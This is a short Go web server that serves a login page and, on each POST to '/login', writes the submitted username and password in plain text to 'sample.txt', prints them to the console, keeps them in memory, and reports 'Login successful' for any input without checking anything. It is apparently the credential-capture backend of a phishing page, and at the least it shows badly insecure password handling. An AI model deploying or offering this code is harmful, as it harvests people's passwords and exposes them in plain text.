package main

import (
	"fmt"
	"net/http"
	"os"
)

var users = map[string]string{}

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "login.html")
	})

	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			err := r.ParseForm()
			if err != nil {
				http.Error(w, "Invalid request", http.StatusBadRequest)
				return
			}
			username := r.Form.Get("username")
			password := r.Form.Get("password")

			file, err := os.OpenFile("sample.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}
			defer file.Close()

			_, err = file.WriteString(username + ":" + password + "\n")
			if err != nil {
				fmt.Println(err)
				return
			}

			print(username + ":")
			print(password)
			println("")

			users[username] = password

			fmt.Fprintf(w, "Login successful")
		} else {
			http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		}
	})

	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		panic(err)
	}
}
